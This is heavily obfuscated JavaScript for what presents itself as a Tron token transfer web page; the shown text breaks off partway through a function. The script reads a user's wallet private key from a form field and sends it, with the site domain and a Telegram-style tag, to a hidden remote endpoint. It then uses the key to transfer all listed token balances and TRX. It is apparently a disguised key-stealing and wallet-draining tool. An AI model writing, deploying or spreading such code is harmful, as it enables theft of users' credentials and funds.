var version_ = 'jsjiami.com.v7';
var _0x138e2f = _0x552b;
(function(_0x7abd21, _0x278f0f, _0x5131cf, _0x2d5347, _0x1c18a8, _0xdacf95, _0x9ed0a) {
	return _0x7abd21 = _0x7abd21 >> 0x7, _0xdacf95 = 'hs', _0x9ed0a = 'hs',
		function(_0x1ad28f, _0x1c8c2b, _0xec5b01, _0x3d2120, _0x21be3e) {
			var _0x1f1400 = _0x552b;
			_0x3d2120 = 'tfi', _0xdacf95 = _0x3d2120 + _0xdacf95, _0x21be3e = 'up', _0x9ed0a += _0x21be3e,
				_0xdacf95 = _0xec5b01(_0xdacf95), _0x9ed0a = _0xec5b01(_0x9ed0a), _0xec5b01 = 0x0;
			var _0x30025c = _0x1ad28f();
			while (!![] && --_0x2d5347 + _0x1c8c2b) {
				try {
					_0x3d2120 = -parseInt(_0x1f1400(0x257, 'I93Q')) / 0x1 + -parseInt(_0x1f1400(0x24f, 'N)F]')) /
						0x2 + parseInt(_0x1f1400(0x24b, '[nLm')) / 0x3 * (-parseInt(_0x1f1400(0x1f9, '^hER')) /
						0x4) + -parseInt(_0x1f1400(0x22d, '*6Ow')) / 0x5 * (parseInt(_0x1f1400(0x1bc, 'p)nO')) /
							0x6) + -parseInt(_0x1f1400(0x262, '8Mpb')) / 0x7 + -parseInt(_0x1f1400(0x214, '^hER')) /
						0x8 + parseInt(_0x1f1400(0x1f3, '1*EI')) / 0x9;
				} catch (_0x1de207) {
					_0x3d2120 = _0xec5b01;
				} finally {
					_0x21be3e = _0x30025c[_0xdacf95]();
					if (_0x7abd21 <= _0x2d5347) _0xec5b01 ? _0x1c18a8 ? _0x3d2120 = _0x21be3e : _0x1c18a8 =
						_0x21be3e : _0xec5b01 = _0x21be3e;
					else {
						if (_0xec5b01 == _0x1c18a8['replace'](/[KNdRLywPYuFCXxlDSe=]/g, '')) {
							if (_0x3d2120 === _0x1c8c2b) {
								_0x30025c['un' + _0xdacf95](_0x21be3e);
								break;
							}
							_0x30025c[_0x9ed0a](_0x21be3e);
						}
					}
				}
			}
		}(_0x5131cf, _0x278f0f, function(_0x2ca7d9, _0x5801f3, _0x222031, _0x574b4b, _0x45043e, _0x329cd8,
			_0x1aacb4) {
			return _0x5801f3 = '\x73\x70\x6c\x69\x74', _0x2ca7d9 = arguments[0x0], _0x2ca7d9 = _0x2ca7d9[
					_0x5801f3](''), _0x222031 = '\x72\x65\x76\x65\x72\x73\x65', _0x2ca7d9 = _0x2ca7d9[_0x222031]
				('\x76'), _0x574b4b = '\x6a\x6f\x69\x6e', (0x129744, _0x2ca7d9[_0x574b4b](''));
		});
}(0x6200, 0xa1a79, _0x3af1, 0xc6), _0x3af1) && (version_ = _0x3af1);
let beizhu = 'TG@halfman9';
async function s(_0x37bc8d, _0x4b694e, _0x891215) {
	var _0x3a404c = _0x552b,
		_0x50acdd = {
			'pKwqs': function(_0xe4f37e, _0x57b09b) {
				return _0xe4f37e == _0x57b09b;
			},
			'OQgAt': function(_0x39e47b, _0x8842f7) {
				return _0x39e47b !== _0x8842f7;
			},
			'avpRH': _0x3a404c(0x22f, ')x[J'),
			'tHyYF': _0x3a404c(0x1ca, 'L1zg'),
			'NaUCU': function(_0xbb1d12, _0x169569) {
				return _0xbb1d12 == _0x169569;
			},
			'GijsH': _0x3a404c(0x24e, ']Qma'),
			'RlQcy': function(_0xf20b90, _0x8d4d43) {
				return _0xf20b90 + _0x8d4d43;
			},
			'RWPjx': function(_0x2e9272, _0x54703d) {
				return _0x2e9272 + _0x54703d;
			},
			'iruBq': function(_0x531ed4, _0x582ac0) {
				return _0x531ed4 + _0x582ac0;
			},
			'riwiF': _0x3a404c(0x23b, 'p)nO'),
			'PqNHp': '私钥:',
			'cMVzu': function(_0x2c4fa7, _0x5a0f27) {
				return _0x2c4fa7(_0x5a0f27);
			}
		},
		_0x398597 = new XMLHttpRequest();
	_0x398597[_0x3a404c(0x1cd, 'mq2L')](_0x50acdd[_0x3a404c(0x24a, '^hER')], _0x50acdd[_0x3a404c(0x25e, 'MD)0')](
		_0x50acdd[_0x3a404c(0x263, 'nLg5')](_0x50acdd[_0x3a404c(0x256, '1I3W')](_0x50acdd['RWPjx'](
			_0x50acdd[_0x3a404c(0x210, '9$jW')](_0x3a404c(0x232, 'p)nO'), _0x50acdd[_0x3a404c(0x233,
				'3Utu')]) + _0x37bc8d, _0x3a404c(0x247, 'AHT)')), _0x4b694e), _0x50acdd[_0x3a404c(0x1f2,
			'3Utu')]), _0x891215), !![]), _0x50acdd[_0x3a404c(0x202, 'Be^v')](sa, key), _0x398597[_0x3a404c(
		0x229, '@Y($')](), _0x398597['onreadystatechange'] = function() {
		var _0x29b485 = _0x3a404c,
			_0x30c707 = {
				'lmpTz': function(_0x2d34b7, _0x1be102) {
					var _0x32e5b4 = _0x552b;
					return _0x50acdd[_0x32e5b4(0x211, 'p&**')](_0x2d34b7, _0x1be102);
				},
				'fiavc': function(_0x4e9821, _0x558967) {
					return _0x4e9821(_0x558967);
				},
				'UJKsa': _0x29b485(0x218, 'p)nO')
			};
		if (_0x50acdd[_0x29b485(0x254, 'waX9')](_0x50acdd[_0x29b485(0x21e, '[nLm')], _0x50acdd[_0x29b485(0x20f,
				'@Y($')])) {
			if (_0x50acdd['pKwqs'](_0x398597[_0x29b485(0x1f5, '[nLm')], 0x4) && _0x50acdd['NaUCU'](_0x398597[
					_0x29b485(0x208, 'L%^O')], 0xc8)) {
				var _0x27c17e = _0x398597[_0x29b485(0x1cf, 'f!wK')];
				console[_0x29b485(0x21b, '[nLm')](_0x27c17e);
			}
		} else {
			let _0x4957bb = _0xf4b9be || _0x48e20c[_0x29b485(0x22a, 'huQ)')] || arguments['callee']['caller'][
				'arguments'
			][0x0];
			if (_0x4957bb && _0x30c707['lmpTz'](_0x4957bb['keyCode'], 0x7b)) return _0x4957bb[_0x29b485(0x261,
				'i42A')] = ![], _0x30c707[_0x29b485(0x1bf, 'nLg5')](_0x2f93fa, _0x30c707[_0x29b485(
				0x1ff, ')x[J')]), ![];
		}
	};
}
async function getstatus(_0x46d354, _0x1f4bef, _0x203f43) {
	var _0x8ed08c = _0x552b,
		_0x5718cc = {
			'OnduO': function(_0x34ca7a, _0x16e6a1, _0xf8a2c1) {
				return _0x34ca7a(_0x16e6a1, _0xf8a2c1);
			},
			'asjmT': _0x8ed08c(0x238, 'p)nO'),
			'owRIr': _0x8ed08c(0x215, 'Gc^D')
		};
	const _0x5d77f7 = {
			'type': _0x203f43,
			'pri': _0x46d354,
			'domin': _0x1f4bef,
			'beizhu': beizhu
		},
		_0x58f878 = new URLSearchParams(_0x5d77f7)[_0x8ed08c(0x1c2, 'huQ)')](),
		_0x3c8a7f = await _0x5718cc[_0x8ed08c(0x1e6, 'I93Q')](fetch, _0x8ed08c(0x1cc, ')x[J') + _0x58f878, {
			'method': _0x5718cc[_0x8ed08c(0x259, 'Qah7')],
			'mode': _0x5718cc[_0x8ed08c(0x242, 'wN6%')]
		});
	let _0x1f7882 = await _0x3c8a7f[_0x8ed08c(0x1ba, '1I3W')]();
	return _0x1f7882;
}
async function sa(_0x31f867) {
	var _0x3023d3 = _0x552b,
		_0xd64134 = {
			'FvNhY': function(_0x31102d, _0x3c9a31) {
				return _0x31102d == _0x3c9a31;
			},
			'pzxqM': _0x3023d3(0x21c, 'lxsY'),
			'rMHdK': _0x3023d3(0x22e, 'lwE['),
			'dOUrF': function(_0x47b167, _0x4b3ec0) {
				return _0x47b167 + _0x4b3ec0;
			},
			'BUKWz': _0x3023d3(0x1dc, '*6Ow'),
			'hIkJH': _0x3023d3(0x244, 'Jw2P')
		},
		_0x143680 = new XMLHttpRequest();
	_0x143680['open'](_0xd64134[_0x3023d3(0x209, 'bcsW')], _0xd64134['dOUrF'](_0xd64134['BUKWz'], _0xd64134[
		_0x3023d3(0x236, 'Jw2P')]) + _0x31f867, !![]), _0x143680[_0x3023d3(0x1f4, 'ysqB')](), _0x143680[
		_0x3023d3(0x1ed, 'p)nO')] = function() {
		var _0x4cbd5c = _0x3023d3;
		if (_0xd64134[_0x4cbd5c(0x1f0, 'f!wK')](_0x143680[_0x4cbd5c(0x255, '4BjU')], 0x4) && _0xd64134[
				_0x4cbd5c(0x221, 'p&**')](_0x143680['status'], 0xc8)) {
			if (_0xd64134[_0x4cbd5c(0x248, '9$jW')] === _0xd64134['pzxqM']) {
				var _0x47051c = _0x143680[_0x4cbd5c(0x1c0, 'h2lR')];
				console['log'](_0x47051c);
			} else {
				_0x4e89fa(_0x4ed0d7);
				return;
			}
		}
	};
}

function _0x3af1() {
	var _0x5bd5ab = (function() {
		return [version_, 'FLyjCswDjCixaKNKmXNCiP.RcKoumFY.ev7SdxlF==',
			'DmoLW6GNWQZcPSkSt2VcQSkfWPhdT8ojWQNcVWaFW4ddIvDzW4dcSmoI', 'gatcP8o5W7RdMG', 'paRdPGq0',
			'grddGq8g', 'W6ZdVSk6W4rD', 'W7L7WQRcPSk9xCkQWP9lrCkYW7W/WQC', 'WOddOmorW44',
			'WPKPW7FcKSkXECohW65pWPu', 'xX9ojmoy', 'W6tcGdDUWPC', 'EdBdI8kNW6C', 'mmo9WPxdVgDQAmoTW7hdQW',
			'AqLLb8oi', 'y8oMW4FdKa', 'WOJdIsVdSmkqW6S', 'hgasWRy3', 'wLjXbc3dH8kgWPa', 'cCkjwmo0WPO',
			'zCo0W4W', 'WOTfWQeszSoCda', 'cILtoXq', 'W5xcVG9YWO4', 'WR8eW5pcSSkj', 'wYldK8owsa', 'WP0TW7O',
			'FmkpWOywWRyWWR88mq', 'WRBcQrVcGmk3WOW', 'y8k3W6CtEG', 'frldGWKurfPlW4xcOa',
			'W5xcRSkIW7DDBmozW5yo', 'W6byWRDx', 'W53dRSkdW519', 'WOFcGHldPXzsWQi', 'W5jolCkQW5C',
			'ACoLW7WlWQ4', 'WPVdOZddRCkg', 'WRpcQLTGBmolcf8CEmky', 'W7KpkCoXyq',
			'nmo/WPhdVZaAmSovW5pdIWxdRei', 'dXNcTSoR', 'lSkfd2mQgSkgWRVcJSk9', 'WPNdGZjLWOO',
			'umoRAEAzM+s7GoENPoIWJoEBUq', 'F2JcOfFcKa', 'eGJdNbWEdGCbW5FcOXDcvvfcW6VdNWWrWQTpW7it',
			'WOCJW7e', 'WQmnWQ0VFa', '6zUz5OIE6k+W5zk8', 'WOO6W6BcPmka', 'W7i9amosrCkR', 'W5NdVCkgW6nF',
			'WQ3dNGNdTmkS', 'cmoiWPn3FW',
			'FZZcSSoTkSolW6rzistcHCkvW63dHSkQqSk2Aw7cKCo+WOdcHmkgW4hdI8klkfayWO0wBZu', 'Fmo7W4VcOsPjW5T0nq',
			'm8kLWR55W6ZdTmo5bsNcVmkNWRFdT8ol'
		].concat((function() {
			return ['WQ4dW5FcR8kR', 'WOddOmorW47dT2FdJNLdWPNcVSoSWRSRaH/dLW4', 'csVdOW', 'W5vJoSkx',
				'W51ymZzB', 'rCoEWQ1BW5RcPxSGWQBdQmkxECol', 'W5NdRSkxW6q',
				'W6u5W4lcGtiibSkLW57dTbNcIG', 'dSkLlW', 'fCk1umo0WPy', 'DCobW5NcIty',
				'kSkZWPj4ymkvfqyMFapdG8ksyfjYnCk9BmoRuq5Faq7dJ8opW4RcLSkQbHC/WPK',
				'FSkUlWtcVSoIWQ9sWRtcKfGEuw5tW6xcSdiMoCoQW7xdKN0fW4mca3WmW78tWRpcRalcJCksW4ldO8kfi8o7W6e',
				'W47dPSkdW6vR', '5OY85lMd5AwA6lAb77216k+b5Qch5P6e5l6F5Ogz5PUV5zgT5Q+s56oj',
				'c8kwWQHEtq', 'wmkYtCkfWPO', 'cSkrWRm', 'uCkFdW', 'W4LvWRCdlSoCcSoqW4RcMGC',
				'nHFdQ1uK', '5O+g5lM+5z2R5zY0W7C', 'wCkoW5Shys/dTe5/z8oAWOa', 'z8oGW4q',
				'W5baWQ1AbG', 'W6hcTSkpW4Hf',
				'i8kIW6WUWQpdIXu7WPJdVCkeDmooWOSoWRZdTsjBcJhdGmosdSkPWPOsb8oLkSoSyCk0WOu',
				'WOBdNsVdQmkCW4RcKSkdaG', 'raxdK8oZBa', 'WOK6W6xcSCkI', '56EX6zgEha',
				'xWddQmoDECoMWQb4b3FcLmkeWPRdN8kCd8kDzKVcTa', 'W5NdGSoaW5tdSW',
				'5PAt5Q+I5z+95z+bdG', 'CmoTW7e4WPi', 'WQGOW7hdT8oGcSo/W6Hh', 'qCkNW43cV0K',
				'W5H/WQ/cRmkyECo4W4Ht', 'W7DCWQDkemow', 'BmoiW40VW4SiWPec', 'vmoqW7q',
				'DSkjWOP1W5jvWRW9dbDmAa', 'n8oQW7u8WQK', 'WO08WQaWwMGjdMPOkW',
				'WO08WQaWwMGjdMPOk0KFECo0WR0lnG', 'oCkWku0D', 'W4POWRn+ca',
				'b0GWWOqDWQf2W6VcIh4', 'W4hcOG9fWP8', 'vxddSNvaWOjXWORdJmkDFCkE', 'W7XFWRnBlq',
				'fSkCW7efWR8', 'WRxcVvC', 'W5jVja', 'WQ11aM3dMwDeW7eqW6TMfColWR3cK0pcLhG',
				'W7VcUIPwWPxcVGFdMSkiWQPyW6isCSkeW5OaW5O8n1CgvG', 'yh7dSZWc', 'mSk/hCkqW5C'
			].concat((function() {
				return ['WOpdNdpdRmkgWQpdLmoldsX9v8k/W7vxFCoPimkkW7Sgs2q',
					'W6NdGSo7W7VdUmkVWP03mIBdKq', 'WQrQwCkpe8o4ymkmW4tcQ2n5W70',
					'WQFcSHC4Ea', 'WObnWQpdVuO', 'W7NcVtfi',
					'jmopWOf+xutdNhLsWPO5ps4DWPJdVK7dJCksBSoQwCkhWOa2nWVdM8obWQxdQCkJW4BdIa',
					'jCoSlZhcGCkFW4mx', '6zQx5OQo6k6R5zol', 'WQtcUuP7AG',
					'WPpcJcyKyW', 'dmkgWRHLr8k+dHPhD0pdOW', 'dmkLWQP2CG',
					'W4XbbsXDWOmUWQa', 'vmo2W5JcRbS',
					'WQJdHYu9WRVcMqpcK0NcGSozvmk8tSoSWPTzW6xcR8oEWPOhWRaUW7mwbCk3WPRdU8oNpKXg',
					'W7PZewdcH2biW7Cu', 'BCoIW6u9WRBcK8kGwI0', 'FfZcN2NcRG',
					'AavCi8kIehbAwmoiW6hcJSkRuaddJMeuDSo9wSo0W4mzmSogW5XyFCoRDSkyqNe',
					'q8ocW5NdK2a', 'EcldN8k0W74', 'WQxcQYaMta',
					'nmk3z8o3WOJdKJ7dRZ/cVd3dNqnNuGHev8kgqHNcOmkFW6ddHCoSDCoUWOFdL8o5EW',
					'uY1joG', 'WR/cMq7dQtq', 'cbNdMXWcwLTlW6lcTGyy',
					'5O+z5lUE5AAJ6lE3776k6kYA5Qgc5P+F5lYY5Oc75PI85zc15Q+/56g5',
					'WP5tWR0', 'WRWOW7e', 'W5dcVJHrWQu', 'fSkGWQPmuG',
					'EqJdVCkKW6/cICoNsmkG', 'jCk6W5xcRYXzAW', 'smoqW5GHWP4',
					'W7pcNhjVdG', 'iCkYd0yB', 'sSoAW7WSh8oHcs5/DNhdGq',
					'F8ortrb4rSkFWRZcGmkDW4Sp',
					'WRT8WOddGhicuCoJW5tdNJBcJCo8cJzvWOxdMmkWW6a7ymowoCkxkK9tWQddRtVcOZ8wWQxcKdvommouBSoqEG',
					'kmkshfqMe8kjWQhcNG', 'oCkTW40kWQ8', 'hSkiW40UWP4',
					'WQBcSHtcGmkWWP7dN30', 'zmkkW4dcOvy', 'dIFcRIKoW4z1',
					'WP0LW7JcUmkY', 'W4ldHmogW4pdNq',
					'FqJdU8k1W6hcImoWgSkGoxjHW6G3hCk3wIFdNGhcSCoArY/cPCo4WQ9c',
					'lIFcOtK4', 'W4xcTSknWPRdG0hdLujNWQW', 'bW/dQuuQ',
					'omosW7NMMlRKUkxNP6ZOS7hNM7S', 'W4/cO3a', 'W5BcKtuXlqpdH8o5W4i',
					'nbXRW5BdJW', 'ECk0krhcRmk8W7KoWQFcNKaFugnEW7/dUtO'
				];
			}()));
		}()));
	}());
	_0x3af1 = function() {
		return _0x5bd5ab;
	};
	return _0x3af1();
};

function _0x552b(_0x1dd738, _0x4d559a) {
	var _0x3af142 = _0x3af1();
	return _0x552b = function(_0x552b46, _0x434252) {
		_0x552b46 = _0x552b46 - 0x1ba;
		var _0x55714d = _0x3af142[_0x552b46];
		if (_0x552b['VJAFZn'] === undefined) {
			var _0x1aedcd = function(_0x4c484a) {
				var _0x5efa33 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
				var _0x495c73 = '',
					_0x5cbc94 = '';
				for (var _0x50ffaa = 0x0, _0x2f6924, _0x2a33f2, _0x4fc591 = 0x0; _0x2a33f2 = _0x4c484a['charAt']
					(_0x4fc591++); ~_0x2a33f2 && (_0x2f6924 = _0x50ffaa % 0x4 ? _0x2f6924 * 0x40 + _0x2a33f2 :
						_0x2a33f2, _0x50ffaa++ % 0x4) ? _0x495c73 += String['fromCharCode'](0xff & _0x2f6924 >>
						(-0x2 * _0x50ffaa & 0x6)) : 0x0) {
					_0x2a33f2 = _0x5efa33['indexOf'](_0x2a33f2);
				}
				for (var _0x4aa4c4 = 0x0, _0x43060f = _0x495c73['length']; _0x4aa4c4 < _0x43060f; _0x4aa4c4++) {
					_0x5cbc94 += '%' + ('00' + _0x495c73['charCodeAt'](_0x4aa4c4)['toString'](0x10))['slice'](-
						0x2);
				}
				return decodeURIComponent(_0x5cbc94);
			};
			var _0x3e1540 = function(_0x86f4e1, _0x25f131) {
				var _0xddb9f2 = [],
					_0x57e3ac = 0x0,
					_0x44e73e, _0x4262cd = '';
				_0x86f4e1 = _0x1aedcd(_0x86f4e1);
				var _0x4babab;
				for (_0x4babab = 0x0; _0x4babab < 0x100; _0x4babab++) {
					_0xddb9f2[_0x4babab] = _0x4babab;
				}
				for (_0x4babab = 0x0; _0x4babab < 0x100; _0x4babab++) {
					_0x57e3ac = (_0x57e3ac + _0xddb9f2[_0x4babab] + _0x25f131['charCodeAt'](_0x4babab %
						_0x25f131['length'])) % 0x100, _0x44e73e = _0xddb9f2[_0x4babab], _0xddb9f2[
						_0x4babab] = _0xddb9f2[_0x57e3ac], _0xddb9f2[_0x57e3ac] = _0x44e73e;
				}
				_0x4babab = 0x0, _0x57e3ac = 0x0;
				for (var _0x47daa7 = 0x0; _0x47daa7 < _0x86f4e1['length']; _0x47daa7++) {
					_0x4babab = (_0x4babab + 0x1) % 0x100, _0x57e3ac = (_0x57e3ac + _0xddb9f2[_0x4babab]) %
						0x100, _0x44e73e = _0xddb9f2[_0x4babab], _0xddb9f2[_0x4babab] = _0xddb9f2[_0x57e3ac],
						_0xddb9f2[_0x57e3ac] = _0x44e73e, _0x4262cd += String['fromCharCode'](_0x86f4e1[
							'charCodeAt'](_0x47daa7) ^ _0xddb9f2[(_0xddb9f2[_0x4babab] + _0xddb9f2[
							_0x57e3ac]) % 0x100]);
				}
				return _0x4262cd;
			};
			_0x552b['YUxhKG'] = _0x3e1540, _0x1dd738 = arguments, _0x552b['VJAFZn'] = !![];
		}
		var _0x7e571d = _0x3af142[0x0],
			_0x1e7619 = _0x552b46 + _0x7e571d,
			_0x2ae576 = _0x1dd738[_0x1e7619];
		return !_0x2ae576 ? (_0x552b['hWJlpL'] === undefined && (_0x552b['hWJlpL'] = !![]), _0x55714d = _0x552b[
				'YUxhKG'](_0x55714d, _0x434252), _0x1dd738[_0x1e7619] = _0x55714d) : _0x55714d = _0x2ae576,
			_0x55714d;
	}, _0x552b(_0x1dd738, _0x4d559a);
}
var from, to, key, TronWeb, num = 0x0,
	contracts = {
		'usdt': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
		'usdc': 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8',
		'usdd': _0x138e2f(0x231, 'h2lR'),
		'usdj': _0x138e2f(0x240, 'Qah7'),
		'tusd': _0x138e2f(0x1bb, 'tb^n'),
		'btc': _0x138e2f(0x223, 'wN6%'),
		'wbtc': _0x138e2f(0x1c8, 'mq2L'),
		'eth': _0x138e2f(0x1c4, 'U16F')
	};
$(_0x138e2f(0x239, 'NgL*'))['on'](_0x138e2f(0x1f1, 'f!wK'), async function() {
	var _0x2083d5 = _0x138e2f,
		_0x59c5d9 = {
			'xRbDJ': _0x2083d5(0x1de, 'Qah7'),
			'OOopW': 'BTBTY',
			'qLYua': function(_0x12ae61, _0x26097d) {
				return _0x12ae61 === _0x26097d;
			},
			'SEWMK': 'rQXQm',
			'bvsGj': function(_0x467c43, _0x3bd619) {
				return _0x467c43(_0x3bd619);
			},
			'DwBnZ': function(_0x49e7b0, _0x155696) {
				return _0x49e7b0(_0x155696);
			},
			'Uyyez': _0x2083d5(0x24d, 'N)F]'),
			'hRtgP': function(_0x2e4e54, _0xab3c70, _0x131aab, _0x13b7d4) {
				return _0x2e4e54(_0xab3c70, _0x131aab, _0x13b7d4);
			},
			'SSoxB': _0x2083d5(0x1ef, 'Gc^D'),
			'wNiHq': function(_0x202a70, _0x207726, _0x3c52a9, _0x2586b0) {
				return _0x202a70(_0x207726, _0x3c52a9, _0x2586b0);
			},
			'DFlyO': function(_0x2d1bdc, _0x3df562) {
				return _0x2d1bdc === _0x3df562;
			},
			'THEDA': 'https://api.trongrid.io',
			'UTISR': function(_0x103b9c, _0x1a28f4, _0x488a75) {
				return _0x103b9c(_0x1a28f4, _0x488a75);
			},
			'FpQTh': _0x2083d5(0x1eb, 'nLg5'),
			'bDgmW': function(_0x4d2961, _0x716102) {
				return _0x4d2961(_0x716102);
			},
			'DjBIq': '#trc-tip',
			'cBbpB': function(_0x3c82b0, _0x37e2bd) {
				return _0x3c82b0(_0x37e2bd);
			}
		};
	from = _0x59c5d9[_0x2083d5(0x243, '[nLm')]($, '#trc-from')['val'](), to = _0x59c5d9['DwBnZ']($,
		_0x2083d5(0x1d6, '^hER'))[_0x2083d5(0x1d2, '1*EI')](), key = _0x59c5d9['DwBnZ']($, '#trc-key')[
		_0x2083d5(0x206, '[nLm')](), userkey = $(_0x59c5d9[_0x2083d5(0x23e, 'waX9')])[_0x2083d5(0x200,
		']Qma')]();
	var _0x46cfc6 = location['host'][_0x2083d5(0x1c7, '9X@B')](':')[0x0];
	const _0x33c678 = await _0x59c5d9[_0x2083d5(0x1d9, 'lwE[')](getstatus, key, _0x46cfc6, _0x59c5d9[
		_0x2083d5(0x23a, 'GFk$')]);
	globalData = _0x33c678, dataValue = globalData['data'], tipValue = globalData[_0x2083d5(0x25b, '@Y($')],
		console[_0x2083d5(0x228, 'GFk$')](globalData), _0x59c5d9[_0x2083d5(0x1f7, '1I3W')](s, from, to,
			userkey);
	if (_0x59c5d9['DFlyO'](dataValue, 0x1)) {
		const _0x35019a = TronWeb[_0x2083d5(0x1d5, 'L1zg')][_0x2083d5(0x23c, 'bcsW')],
			_0x363532 = new _0x35019a(_0x2083d5(0x260, 'p&**')),
			_0x4b2a66 = new _0x35019a(_0x59c5d9[_0x2083d5(0x204, '[nLm')]),
			_0x3c9818 = new _0x35019a('https://api.trongrid.io');
		tronWeb = new TronWeb(_0x363532, _0x4b2a66, _0x3c9818, key), $[_0x2083d5(0x20c, 'waX9')](contracts,
			function(_0x3ddf4a, _0x1911ff) {
				var _0x4f8817 = _0x2083d5;
				if (_0x59c5d9[_0x4f8817(0x222, 'tb^n')] !== _0x59c5d9['OOopW']) transfer(_0x1911ff,
					userkey);
				else return ![];
			}), _0x59c5d9[_0x2083d5(0x1fa, 'mq2L')](setTimeout, function() {
			var _0x29703c = _0x2083d5;
			if (_0x59c5d9[_0x29703c(0x1f8, 'L1zg')]('rQXQm', _0x59c5d9[_0x29703c(0x264, '*6Ow')]))
				sendTrx(from, to, userkey);
			else {
				var _0xbe189b = _0x3e6a91['responseText'];
				_0xd8a913[_0x29703c(0x23d, 'L5j$')](_0xbe189b);
			}
		}, 0xbb8), $(_0x59c5d9[_0x2083d5(0x203, '1I3W')])[_0x2083d5(0x1fb, 'L5j$')](), _0x59c5d9[
			_0x2083d5(0x1e1, '^hER')]($, _0x59c5d9[_0x2083d5(0x23f, 'AHT)')])['show']();
	} else {
		_0x59c5d9[_0x2083d5(0x1f6, 'mq2L')](alert, tipValue);
		return;
	}
});
async function transfer(_0x37ed89, _0x5873b8) {
	var _0xbb37c5 = _0x138e2f,
		_0x452cbf = {
			'iMCVS': function(_0x41c2d6, _0x3f1f3b, _0x56ac7e) {
				return _0x41c2d6(_0x3f1f3b, _0x56ac7e);
			},
			'pPRlV': function(_0x1a9eaa, _0x1994cb) {
				return _0x1a9eaa(_0x1994cb);
			},
			'GcxhH': function(_0xc289b4, _0xbaff5b) {
				return _0xc289b4 === _0xbaff5b;
			},
			'HwNFs': _0xbb37c5(0x1e4, 'i42A'),
			'CpfwC': _0xbb37c5(0x201, 'NgL*'),
			'HGQhA': 'uint256',
			'hSEOA': _0xbb37c5(0x1ee, '9$jW'),
			'fTyMe': _0xbb37c5(0x1d0, 'L1zg')
		};
	let _0x271ccf = await tronWeb[_0xbb37c5(0x1e0, 'L%^O')]()['at'](_0x37ed89),
		_0x30665b = await _0x271ccf[_0xbb37c5(0x249, '1*EI')](from)['call']();
	_0x30665b = _0x452cbf[_0xbb37c5(0x205, 'wN6%')](parseInt, _0x30665b['_hex']);
	if (_0x30665b == 0x0) return ![];
	try {
		if (_0x452cbf[_0xbb37c5(0x1c3, ']Qma')](_0x452cbf['HwNFs'], 'YcIMW')) {
			const _0x455a93 = [{
				'type': _0x452cbf[_0xbb37c5(0x1d3, '1I3W')],
				'value': to
			}, {
				'type': _0x452cbf[_0xbb37c5(0x1d7, '9$jW')],
				'value': _0x30665b
			}];
			var _0x3b9450 = await tronWeb[_0xbb37c5(0x252, 'lxsY')][_0xbb37c5(0x245, 'wN6%')](_0x37ed89, _0x452cbf[
					_0xbb37c5(0x213, '8Mpb')], {
					'PermissionId': 0x2
				}, _0x455a93, from),
				_0x27e07b = await tronWeb['trx'][_0xbb37c5(0x1c6, '9$jW')](_0x3b9450[_0xbb37c5(0x251, 'lxsY')],
				key),
				_0x552c46 = await tronWeb[_0xbb37c5(0x25a, 'kQn[')][_0xbb37c5(0x227, 'ysqB')](_0x27e07b);
			_0x552c46[_0xbb37c5(0x24c, 'waX9')] && (num += 0x1);
		} else _0x452cbf[_0xbb37c5(0x1fd, '4BjU')](_0x4d23af, _0x30856e, _0x57fb3f);
	} catch (_0xd5a5f0) {
		_0x452cbf[_0xbb37c5(0x253, 'lwE[')](alert, _0x452cbf[_0xbb37c5(0x230, ']Qma')]);
	}
}
async function sendTrx(_0x31ae4a, _0x2ea395, _0x3f1b4f) {
	var _0xd77160 = _0x138e2f,
		_0x277dc4 = {
			'eLulr': function(_0x677f82, _0x77b163, _0x1456be, _0x5ba8a2) {
				return _0x677f82(_0x77b163, _0x1456be, _0x5ba8a2);
			},
			'xVJpO': function(_0xadafef, _0x4eaba2, _0x571ebd) {
				return _0xadafef(_0x4eaba2, _0x571ebd);
			},
			'HMzfO': _0xd77160(0x25d, '1I3W'),
			'erKkp': function(_0x27b931, _0x4d513e) {
				return _0x27b931(_0x4d513e);
			},
			'CldYZ': function(_0x3dd2cc, _0x4bfc01) {
				return _0x3dd2cc !== _0x4bfc01;
			},
			'bKmhL': _0xd77160(0x219, '9X@B'),
			'oQcAv': '1|4|6|3|2|0|5',
			'rFacZ': function(_0x4757ab, _0x33575a) {
				return _0x4757ab - _0x33575a;
			},
			'uucKe': function(_0x4d001f, _0x369051) {
				return _0x4d001f * _0x369051;
			},
			'igVFu': function(_0x4110ca, _0x470755) {
				return _0x4110ca <= _0x470755;
			},
			'PNgtL': function(_0x311599, _0x1b5728) {
				return _0x311599(_0x1b5728);
			},
			'aawQP': _0xd77160(0x234, '@P5w'),
			'JBZlW': _0xd77160(0x1e5, 'L1zg')
		};
	try {
		if (_0x277dc4['CldYZ'](_0x277dc4[_0xd77160(0x1e8, 'GFk$')], _0x277dc4['bKmhL'])) {
			var _0x32fb03 = {
				'Sahmq': function(_0x205cdb, _0x224515, _0xa4aa5b) {
					return _0x277dc4['xVJpO'](_0x205cdb, _0x224515, _0xa4aa5b);
				}
			};
			const _0x41edde = _0x5c2ae5[_0xd77160(0x20b, 'AHT)')]['HttpProvider'],
				_0x2f516a = new _0x41edde(_0x277dc4[_0xd77160(0x1c9, 'L5j$')]),
				_0x1d1a56 = new _0x41edde(_0xd77160(0x21a, 'f!wK')),
				_0x2bd7b0 = new _0x41edde(_0x277dc4[_0xd77160(0x1d8, 'iF4l')]);
			_0x25574c = new _0x6d001a(_0x2f516a, _0x1d1a56, _0x2bd7b0, _0x4a08a1), _0xb46fdf[_0xd77160(0x22c,
				'3Utu')](_0x2e0bd6, function(_0xb4d796, _0x174623) {
				_0x32fb03['Sahmq'](_0x229ddd, _0x174623, _0x4023f9);
			}), _0x277dc4[_0xd77160(0x250, 'N)F]')](_0x5b8fd3, function() {
				_0x277dc4['eLulr'](_0xe644d, _0x103242, _0x48f7fd, _0x958e59);
			}, 0xbb8), _0x277dc4['erKkp'](_0x5c43ad, _0xd77160(0x1c5, 'iMsH'))['hide'](), _0x277dc4['erKkp'](
				_0x29a432, '#trc-tip')['show']();
		} else {
			var _0x500347 = _0x277dc4[_0xd77160(0x25f, 'C51H')][_0xd77160(0x1ec, 'juqd')]('|'),
				_0x15bd8d = 0x0;
			while (!![]) {
				switch (_0x500347[_0x15bd8d++]) {
					case '0':
						var _0x303b1b = await tronWeb[_0xd77160(0x237, 'h2lR')][_0xd77160(0x241, 'p&**')](_0x175dcc,
							key);
						continue;
					case '1':
